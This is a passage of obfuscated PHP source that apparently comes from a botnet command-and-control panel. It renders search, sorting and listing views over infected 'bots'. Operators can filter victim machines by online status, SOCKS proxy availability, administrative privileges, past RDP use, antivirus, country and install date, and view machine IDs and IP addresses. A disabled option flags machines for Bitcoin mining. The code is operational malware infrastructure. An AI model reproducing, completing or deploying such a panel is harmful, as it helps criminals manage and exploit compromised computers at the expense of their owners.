    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
}
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t\n\t\t\t\t\t\t</tbody>\n\t\t\t\t</table>\n\t\t\t\t</font>\n\t\t\t</td>\n\n\t\t\t";
$geoip_count = $sqlGeoIP->GetGeoRecordsCount();
if ($geoip_count < 35000) {
    $geoip_count = 0;
}
if ($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_NO_CHARTS) {
    $geoip_count = 0;
}
echo "\t\t\t\n\t\t\t<td valign=\"top\">\n\t\t\t\t<!-- Search table -->\n<div class=\"tabbable\">\n  <ul class=\"nav nav-tabs\">\n\t";
if (0 < $geoip_count) {
    echo "    <li ";
    if ($is_search != true) {
        echo "class=\"active\"";
    }
    echo "><a href=\"#pane1\" data-toggle=\"tab\">Overview&nbsp;&nbsp;&nbsp;</a></li>\n\t";
}
echo "    <li ";
if ($is_search == true) {
    echo "class=\"active\"";
}
echo "><a href=\"#pane2\" data-toggle=\"tab\">Search&nbsp;&nbsp;&nbsp;</a></li>\n  </ul>\n  <div class=\"tab-content\">\n\t";
if (0 < $geoip_count) {
    echo "    <div id=\"pane1\" class=\"tab-pane ";
    if ($is_search != true) {
        echo "active";
    }
    echo "\">\n\t\n\t\n<!-- OS Versions -->\n\t\t<table class=\"table-bordered table-condensed\" style=\"width: 1320px;\">\n\t\t\t\t<tr>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t<table align=\"center\">\n\t\t\t\t\t<tr>\n\t\t\t\t\t<td style=\"border: none;\">\n\t\t\t\t\t\t\t\t\t\t\t\t\t<span style=\"position: relative; left: 120px; top: 9px;\"><strong>Top 5 Countries</strong></span>\n\t\t\t\t\t<div id=\"top_cn_chart\" style=\"position: relative; left: 1px; height:375px; width:475px; font-size: 14px; face: font-family: Tahoma;\"></div>\n\t\t\t\t\t</td>\n\t\t\t\t\t<td style=\"border: none;\">\n\t\t\t\t\t\t<div id=\"vmap\" style=\"width: 680px; height: 350px;\"></div>\n\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t</table>\n\n\t\t\t\t\t<script>\n\t\t\t\t\t\t";
    $worldmap = new CWorldMap();
    $worldmap->SetInternalLink($main_sql_link);
    echo $worldmap->GenerateMainGraphs($stats_total_bots);
    echo "\t\t\t\t\t</script>\n\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t\t<!-- Sort stuff -->\n\t\t\t\t\t\t<div class=\"container-fluid\">\n\t\t\t\t\t\t<form name=\"sortie_form\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\">\n\t\t\t\t\t\t\n\t\t\t\t\t\t<!-- Per page -->\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Number of bots per page: &nbsp;</span>\n\t\t\t\t\t\t<select id=\"isort_num_per_page\" name=\"sortie_num_per_page\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px; width: 80px;\">\n\t\t\t\t\t\t\t<option value=\"20\" ";
    echo $max_per_page == 20 ? "selected" : "";
    echo ">20</option>\n\t\t\t\t\t\t\t<option value=\"40\" ";
    echo $max_per_page == 40 ? "selected" : "";
    echo ">40</option>\n\t\t\t\t\t\t\t<option value=\"60\" ";
    echo $max_per_page == 60 ? "selected" : "";
    echo ">60</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Sort by: &nbsp;</span>\n\t\t\t\t\t\t<select name=\"sortie_type\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px;\">\n\t\t\t\t\t\t\t<option value=\"sortie_status\" ";
    echo $sort_by_type === "sortie_status" ? "selected" : "";
    echo ">Online status</option>\n\t\t\t\t\t\t\t<option value=\"sortie_os\" ";
    echo $sort_by_type === "sortie_os" ? "selected" : "";
    echo ">Operating System</option>\n\t\t\t\t\t\t\t<option value=\"sortie_version\" ";
    echo $sort_by_type === "sortie_version" ? "selected" : "";
    echo ">Version</option>\n\t\t\t\t\t\t\t<option value=\"sortie_installdate\" ";
    echo $sort_by_type === "sortie_installdate" ? "selected" : "";
    echo ">Install Date</option>\n\t\t\t\t\t\t\t<option value=\"sortie_lastcheckin\" ";
    echo $sort_by_type === "sortie_lastcheckin" ? "selected" : "";
    echo ">Last CheckIn Date</option>\n\t\t\t\t\t\t\t<option value=\"sortie_ip\" ";
    echo $sort_by_type === "sortie_ip" ? "selected" : "";
    echo ">IP Address</option>\n\t\t\t\t\t\t\t<option value=\"sortie_group\" ";
    echo $sort_by_type === "sortie_group" ? "selected" : "";
    echo ">Group</option>\n\t\t\t\t\t\t\t<option value=\"sortie_bk\" ";
    echo $sort_by_type === "sortie_bk" ? "selected" : "";
    echo ">Bots killed</option>\n\t\t\t\t\t\t\t<option value=\"sortie_location\" ";
    echo $sort_by_type === "sortie_location" ? "selected" : "";
    echo ">Location</option>\n\t\t\t\t\t\t\t<option value=\"sortie_av\" ";
    echo $sort_by_type === "sortie_av" ? "selected" : "";
    echo ">AntiVirus</option>\n\t\t\t\t\t\t\t<option value=\"sortie_socks\" ";
    echo $sort_by_type === "sortie_socks" ? "selected" : "";
    echo ">Version</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Sort order: &nbsp;</span>\n\t\t\t\t\t\t<select name=\"sortie_order\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px; width: 120px;\">\n\t\t\t\t\t\t\t<option value=\"asc\" ";
    echo $sort_order === "asc" ? "selected" : "";
    echo ">Ascending</option>\n\t\t\t\t\t\t\t<option value=\"desc\" ";
    echo $sort_order === "desc" ? "selected" : "";
    echo ">Descending</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t\n\t\t\t\t\t\t&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<input name=\"sortie_submit\" value=\"Set sort options\" type=\"submit\" class=\"btn\" style=\"position: relative; top: -5px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 110px;\">\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t</div>\n\n\t\t\t\t\t</td>\n\t\t\t</tr>\n\n\t\t</table>\n    </div>\n\t";
}
echo "    <div id=\"pane2\" class=\"tab-pane ";
echo $geoip_count == 0 || $is_search == true ? "active" : "";
echo "\">\n\t<table class=\"table-bordered table-condensed\" style=\"width: 1320px;\">\n\t<tr>\n\t\t<td>\n\t\t\t\t<form class=\"form-horizontal\" style=\"display:inline;\" method=\"get\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\t\t\t\t\t\t<fieldset>\n\t\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">Various filters</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_online\" style=\"position: relative; top: -1px\" ";
if (isset($_GET["so_online"])) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tOnline\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_comment\" style=\"position: relative; top: -1px\" ";
if (isset($_GET["so_comment"])) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas individual comment\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_socks4\" style=\"position: relative; top: -1px\" ";
if (isset($_GET["so_socks4"])) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas SOCKS server running\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <!--<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 160px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_dotnet\" style=\"position: relative; top: -1px\" ";
if ($e_search_mask_options & BOT_ATTRIBUTE_HAS_NET_FRAMEWORK) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas .NET Framework\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <!--<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 160px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_steam\" style=\"position: relative; top: -1px\" ";
if ($e_search_mask_options & BOT_ATTRIBUTE_HAS_STEAM) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas Steam\n\t\t\t\t\t\t\t  </label>-->\n\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_admin\" style=\"position: relative; top: -1px\" ";
if ($e_search_mask_options & BOT_ATTRIBUTE_IS_ELEVATED) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas administrative privileges\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 190px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"so_rdp\" style=\"position: relative; top: -1px\" ";
if ($e_search_mask_options & BOT_ATTRIBUTE_HAS_USED_RDP) {
    echo "checked";
}
echo ">\n\t\t\t\t\t\t\t\tHas used RDP at least once before\n\t\t\t\t\t\t\t  </label>\n\t\t\t\t\t\t\t  <!-- Have to fix this in a later release -->\n\t\t\t\t\t\t\t  <!--<label class=\"checkbox\" style=\"font-size: 10px; face: font-family: Tahoma; width: 200px;\">\n\t\t\t\t\t\t\t\t<input type=\"checkbox\" id=\"optionsCheckbox\" name=\"search_options_bitcoin\" style=\"position: relative; top: -1px\" >\n\t\t\t\t\t\t\t\tAre recommended for BitCoin mining\n\t\t\t\t\t\t\t  </label>-->\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">Operating Systems</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t\t\t  <select multiple id=\"multiSelect\" style=\"font-size: 10px; face: font-family: Tahoma; height: 120px;\" name=\"soo_systems[]\">\n\t\t\t\t\t\t\t  ";
$fm_sel = "selected=\"selected\"";
echo "\t\t\t\t\t\t\t\t<option value=\"all\" ";
echo !$e_search_task_os ? $fm_sel : "";
echo ">All Operating Systems</option>\n\t\t\t\t\t\t\t\t<option value=\"w8\" ";
echo $e_search_task_os & WINDOWS_VERSION_W8 ? $fm_sel : "";
echo ">Windows 8</option>\n\t\t\t\t\t\t\t\t<option value=\"w7\" ";
echo $e_search_task_os & WINDOWS_VERSION_W7 ? $fm_sel : "";
echo ">Windows 7</option>\n\t\t\t\t\t\t\t\t<option value=\"wv\" ";
echo $e_search_task_os & WINDOWS_VERSION_VS ? $fm_sel : "";
echo ">Windows Vista</option>\n\t\t\t\t\t\t\t\t<option value=\"wxp\" ";
echo $e_search_task_os & WINDOWS_VERSION_XP ? $fm_sel : "";
echo ">Windows XP</option>\n\t\t\t\t\t\t\t\t<option value=\"ws08\" ";
echo $e_search_task_os & WINDOWS_VERSION_S2008 ? $fm_sel : "";
echo ">Windows Server 2008</option>\n\t\t\t\t\t\t\t\t<option value=\"ws03\" ";
echo $e_search_task_os & WINDOWS_VERSION_S2003 ? $fm_sel : "";
echo ">Windows Server 2003</option>\n\t\t\t\t\t\t\t  </select>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">IP Search</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\n\t\t\t\t\t\t    <input name=\"so_ip\" value=\"";
echo htmlspecialchars($e_search_ip);
echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 4px; ";
echo $font_style;
echo " height: 10px; width: 280px;\">\n\t\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: 5px\">&nbsp;<i>(Only a single IP can be searched at a time)</i><br /></span>\n\t\t\t\t\t\t    </div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">GUID Search</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\n\t\t\t\t\t\t    <input name=\"so_guid\" value=\"";
echo htmlspecialchars($e_search_guid);
echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 4px; ";
echo $font_style;
echo " height: 10px; width: 280px;\">\n\t\t\t\t\t\t\t<span style=\"";
echo $font_style;
echo " height: 120px; position: relative; top: 5px\">&nbsp;<i>(Only a single GUID can be searched at a time)</i><br /></span>\n\t\t\t\t\t\t    </div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  <div class=\"control-group\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">Regional Search</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\n\t\t\t\t\t\t    <input name=\"so_cn\" value=\"";
echo htmlspecialchars($e_search_countries);
echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 4px; ";
echo $font_style;
echo " height: 10px; width: 280px;\">\n\t\t\t\t\t\t\t<span style=\"";
echo $font_style;
echo " height: 120px; position: relative; top: 5px\">&nbsp;<i>(Example: RU, MX, BR, CN, etc...)</i><br /></span>\n\t\t\t\t\t\t    </div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  \n\t\t\t\t\t\t  ";
$e_search_installdate_after_string = "";
$e_search_lastcheckin_after_string = "";
if ($e_search_installdate_after != 0) {
    $e_search_installdate_after_string = date("m/d/Y", $e_search_installdate_after);
}
if ($e_search_lastcheckin_after != 0) {
    $e_search_lastcheckin_after_string = date("m/d/Y", $e_search_lastcheckin_after);
}
echo "\t\t\t\t\t\t  \n\t\t\t\t\t\t  <div class=\"control-group\" style=\"";
echo $font_style;
echo "\">\n\t\t\t\t\t\t\t<label class=\"control-label\" for=\"multiSelect\" style=\"";
echo $font_style;
echo "\">Date search</label>\n\t\t\t\t\t\t\t<div class=\"controls\">\n\t\t\t\t\t\t\t\t<span style=\"";
echo $font_style;
echo " position: relative; top: 5px;\">Installed after (date): &nbsp;</span>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"input-append date\" id=\"dp3\" data-date-format=\"mm/dd/yyyy\" data-date=\"";
echo $e_search_installdate_after_string;
echo "\">\n\t\t\t\t\t\t\t\t\t<input class=\"span2\" size=\"16\" type=\"text\" value=\"";
echo $e_search_installdate_after_string;
echo "\" name=\"so_installdate\" style=\"";
echo $font_style;
echo " position: relative; top: 3px; width: 90px; height: 10px;\" readonly>\n\t\t\t\t\t\t\t\t<span class=\"add-on\" style=\"height: 10px; position: relative; top: 3px;\"><i class=\"icon-th\" style=\"position: relative; top: -2px; \"></i></span>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<span style=\"";
echo $font_style;
echo " position: relative; top: 5px;\">Last check in date after (date): &nbsp;</span>\n\t\t\t\t\t\t\t\t<div class=\"input-append date\" id=\"dp4\" data-date-format=\"mm/dd/yyyy\" data-date=\"";
echo $e_search_lastcheckin_after_string;
echo "\">\n\t\t\t\t\t\t\t\t\t<input class=\"span2\" size=\"16\" type=\"text\" value=\"";
echo $e_search_lastcheckin_after_string;
echo "\" name=\"so_lastcheckindate\" style=\"";
echo $font_style;
echo " position: relative; top: 3px; width: 90px; height: 10px;\" readonly>\n\t\t\t\t\t\t\t\t<span class=\"add-on\" style=\"height: 10px; position: relative; top: 3px;\"><i class=\"icon-th\" style=\"position: relative; top: -2px; \"></i></span>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t  </div>\n\t\t\t\t\t\t  \n\t\t\t\t\t\t  \n\t\t\t\t\t\t\t<input type=\"submit\" class=\"btn btn-primary\" name=\"sb_submit\" value=\"Search\" style=\"";
echo $font_style;
echo " position: relative; top: -45px; left: 720px;\">\n\t\t\t\t\t\t</fieldset>\n\t\t\t\t</form>\n\t\t\t\t\n\t\t\t\t\t<br />\n\t\t\t\t\t\n\t\t\t\t\t\t<!-- Sort stuff -->\n\t\t\t\t\t\t<div class=\"container-fluid\">\n\t\t\t\t\t\t<form name=\"sortie_form\" method=\"post\" action=\"";
echo $_SERVER["REQUEST_URI"];
echo "\">\n\t\t\t\t\t\t\n\t\t\t\t\t\t<!-- Per page -->\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Number of bots per page: &nbsp;</span>\n\t\t\t\t\t\t<select id=\"isort_num_per_page\" name=\"sortie_num_per_page\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px; width: 80px;\">\n\t\t\t\t\t\t\t<option value=\"20\" ";
echo $max_per_page == 20 ? "selected" : "";
echo ">20</option>\n\t\t\t\t\t\t\t<option value=\"40\" ";
echo $max_per_page == 40 ? "selected" : "";
echo ">40</option>\n\t\t\t\t\t\t\t<option value=\"60\" ";
echo $max_per_page == 60 ? "selected" : "";
echo ">60</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Sort by: &nbsp;</span>\n\t\t\t\t\t\t<select name=\"sortie_type\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px;\">\n\t\t\t\t\t\t\t<option value=\"sortie_status\" ";
echo $sort_by_type === "sortie_status" ? "selected" : "";
echo ">Online status</option>\n\t\t\t\t\t\t\t<option value=\"sortie_os\" ";
echo $sort_by_type === "sortie_os" ? "selected" : "";
echo ">Operating System</option>\n\t\t\t\t\t\t\t<option value=\"sortie_version\" ";
echo $sort_by_type === "sortie_version" ? "selected" : "";
echo ">Version</option>\n\t\t\t\t\t\t\t<option value=\"sortie_installdate\" ";
echo $sort_by_type === "sortie_installdate" ? "selected" : "";
echo ">Install Date</option>\n\t\t\t\t\t\t\t<option value=\"sortie_lastcheckin\" ";
echo $sort_by_type === "sortie_lastcheckin" ? "selected" : "";
echo ">Last CheckIn Date</option>\n\t\t\t\t\t\t\t<option value=\"sortie_ip\" ";
echo $sort_by_type === "sortie_ip" ? "selected" : "";
echo ">IP Address</option>\n\t\t\t\t\t\t\t<option value=\"sortie_group\" ";
echo $sort_by_type === "sortie_group" ? "selected" : "";
echo ">Group</option>\n\t\t\t\t\t\t\t<option value=\"sortie_bk\" ";
echo $sort_by_type === "sortie_bk" ? "selected" : "";
echo ">Bots killed</option>\n\t\t\t\t\t\t\t<option value=\"sortie_location\" ";
echo $sort_by_type === "sortie_location" ? "selected" : "";
echo ">Location</option>\n\t\t\t\t\t\t\t<option value=\"sortie_av\" ";
echo $sort_by_type === "sortie_av" ? "selected" : "";
echo ">AntiVirus</option>\n\t\t\t\t\t\t\t<option value=\"sortie_socks\" ";
echo $sort_by_type === "sortie_socks" ? "selected" : "";
echo ">Version</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t&nbsp;&nbsp;&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<span style=\"font-size: 10px; face: font-family: Tahoma; height: 120px; position: relative; top: -5px\">Sort order: &nbsp;</span>\n\t\t\t\t\t\t<select name=\"sortie_order\" style=\"font-size: 10px; face: font-family: Tahoma; height: 25px; width: 120px;\">\n\t\t\t\t\t\t\t<option value=\"asc\" ";
echo $sort_order === "asc" ? "selected" : "";
echo ">Ascending</option>\n\t\t\t\t\t\t\t<option value=\"desc\" ";
echo $sort_order === "desc" ? "selected" : "";
echo ">Descending</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t\n\t\t\t\t\t\t&nbsp;\n\t\t\t\t\t\t\n\t\t\t\t\t\t<input name=\"sortie_submit\" value=\"Set sort options\" type=\"submit\" class=\"btn\" style=\"position: relative; top: -5px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 110px;\">\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t</div>\n\t\t\t\t\n\t\t\t\t</td>\n\t\t\t</tr>\n</table>\n\t</div>\n</div>\n\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\n\t\t\t\t\t<!-- Bot list table -->\n\t\t\t\t";
$is_exgeo_extended = false;
if ($sqlGeoIP->IsExtendedGeoInfoAvailable()) {
    $is_exgeo_extended = true;
}
if ($total_num_bots != 0) {
    echo "<br /><br />";
}
$is_favorite_table_visible = $is_search == false && 0 < $stats_total_fav_bots ? true : false;
echo "<font size=\"1\" face=\"Tahoma\">";
if ($is_favorite_table_visible == true) {
    echo "\t\t\t\t\t<!-- Favorite bot list table -->\n\t\t\t\t\t<span style=\"position: relative; left: 1px;\"><strong>Favorite bots</strong></span>\n\t\t\t\t\t<table id=\"botlist2\" class=\"table table-bordered table-condensed table-striped\" valign=\"top\" style=\"width: 1320px;\">\n\t\t\t\t\t\t\t<thead>\n\t\t\t\t\t\t\t  <tr>\n\t\t\t\t\t\t\t\t<th width=\"15\"></th>\n\t\t\t\t\t\t\t\t<th width=\"185\">Machine ID</th>\n\t\t\t\t\t\t\t\t<th width=\"75\">Group</th>\n\t\t\t\t\t\t\t\t<th width=\"80\">IPv4</th>\n\t\t\t\t\t\t\t\t<th width=\"160\">Location</th>\n\t\t\t\t\t\t\t\t<th width=\"170\">Operating System</th>\n\t\t\t\t\t\t\t\t<th width=\"120\">Install date</th>\n\t\t\t\t\t\t\t\t<th width=\"20\">Version</th>\n\t\t\t\t\t\t\t\t<th width=\"85\">AntiVirus</th>\n\t\t\t\t\t\t\t\t<th width=\"30\">Killed</th>\n\t\t\t\t\t\t\t\t<th width=\"40\">Status</th>\n\t\t\t\t\t\t\t\t<th width=\"50\">Options</th>\n\t\t\t\t\t\t\t  </tr>\n\t\t\t\t\t\t\t</thead>\n\t\t\t\t\t\t\t<tbody>\n\t\t\t\t\t";
    for ($current_index = 0; $current_row = @mysql_fetch_assoc($fav_bots); $current_index++) {
        _obfuscated_0D0E370B123D313E2D2515080B1B24292E363522350632_($current_row, true);
    }
    echo "\t\t\t\t\t\t\t</tbody>\n\t\t\t\t\t</table>\n\t\t\t\t\t";
    _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(true);
    _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_bot_fav_view_page, $fav_max_per_page, $stats_total_fav_bots, "fav_page");
    _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(true);
}
echo "\t\t\t\t\t\n\t\t\t\t\t<!-- Bot list table -->\n\t\t\t\t\t";
echo $is_favorite_table_visible == true ? "<span style=\"position: relative; left: 1px;\"><strong>All bots</strong></span>" : "";
echo "\t\t\t\t\t<table id=\"botlist\" class=\"table table-bordered table-condensed table-striped\" valign=\"top\" style=\"width: 1320px;\">\n\t\t\t\t\t\t\t<thead>\n\t\t\t\t\t\t\t  <tr>\n\t\t\t\t\t\t\t\t<th width=\"15\"></th>\n\t\t\t\t\t\t\t\t<th width=\"185\">Machine ID</th>\n\t\t\t\t\t\t\t\t<th width=\"75\">Group</th>\n\t\t\t\t\t\t\t\t<th width=\"80\">IPv4</th>\n\t\t\t\t\t\t\t\t<th width=\"160\">Location</th>\n\t\t\t\t\t\t\t\t<th width=\"170\">Operating System</th>\n\t\t\t\t\t\t\t\t<th width=\"120\">Install date</th>\n\t\t\t\t\t\t\t\t<th width=\"20\">Version</th>\n\t\t\t\t\t\t\t\t<th width=\"85\">AntiVirus</th>\n\t\t\t\t\t\t\t\t<th width=\"30\">Killed</th>\n\t\t\t\t\t\t\t\t<th width=\"40\">Status</th>\n\t\t\t\t\t\t\t\t<th width=\"50\">Options</th>\n\t\t\t\t\t\t\t  </tr>\n\t\t\t\t\t\t\t</thead>\n\t\t\t\t\t\t\t<tbody>\n\t\t\t\t\t";
if ($total_num_bots == 0) {
    $not_found_text = isset($_GET["sb_submit"]) ? "No bots found matching your query" : "No bots found";
    echo "<tr><td></td><td>" . $not_found_text . "</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><br />\r\n";
} else {
    for ($current_index = 0; $current_row = @mysql_fetch_assoc($all_bots); $current_index++) {
        _obfuscated_0D0E370B123D313E2D2515080B1B24292E363522350632_($current_row, false);
    }
}
echo "\t\t\t\t\t\t\t</tbody>\n\t\t\t\t\t</table>\n\t\t\t\t\t";
$pg_total_bots = $total_num_bots;
if ($is_search == false) {
    $pg_total_bots = $stats_total_bots;
}
_obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(true);
_obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_bot_view_page, $max_per_page, $pg_total_bots, "bots_page");
_obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(true);
echo "<br /></font><!-- End bot tables-->\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t\t</table>\n\t\t\t\t\t</font>\n\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t\t</table>\n";
function _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($time_begin = 0, $time_end = 0)
{
    if ($time_begin == 0 || $time_end == 0) {
        return "N/A";
    }
    $_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_ = new DateTime();
    $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_ = new DateTime();
    $_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_->setTimestamp($time_begin);
    $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_->setTimestamp($time_end);
    $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ = "";
    $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_ = date_diff($_obfuscated_0D272B4019081B120622081C2C5C3F0D06060D323B3111_, $_obfuscated_0D2532053E35383C1E063E02292E191432112635111B11_);
    if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_) {
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->m) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->m . "(M) ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->d) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->d . "d ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->h) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->h . "h ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->i) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->i . "m ";
        }
        if ($_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->s) {
            $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ .= $_obfuscated_0D052909361C121E2525301335293315323F1A0C113501_->s . "s ";
        }
    }
    if (strlen($_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_) < 2) {
        $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_ = "N/A";
    }
    return $_obfuscated_0D35360533140B072E17321A0119363B06051D10232A32_;
}
function _obfuscated_0D372D021030251829183340120E2E15290E142C041D22_($bot_record_info)
{
    if (!isset($bot_record_info) || !isset($bot_record_info["GUID"])) {
        return false;
    }
    global $botsIndex;
    $_obfuscated_0D2504230F223B363D5B2C1F362E19161F181B132C1801_ = false;
    $_obfuscated_0D1E403938232B392710190716281D161D2A38382D0222_ = false;
    $_obfuscated_0D341C5C0E26280E3B0C12290A0B023B2D35312D303032_ = 0;
    $_obfuscated_0D302E2902341F072C1D1C5B24290713360E0326312901_ = 0;
    $_obfuscated_0D36050A01391F1623350F0626141A1215233238375C32_ = sprintf("%u", $bot_record_info["id"]);
    $_obfuscated_0D27232E2A3325073B022315031F211F251B26073F1B11_ = $bot_record_info["ClientStatus"] == BOT_STATUS_ONLINE ? "<font color=\"#339900\">Online</font>" : "<font color=\"#E80000\">Offline</font>";
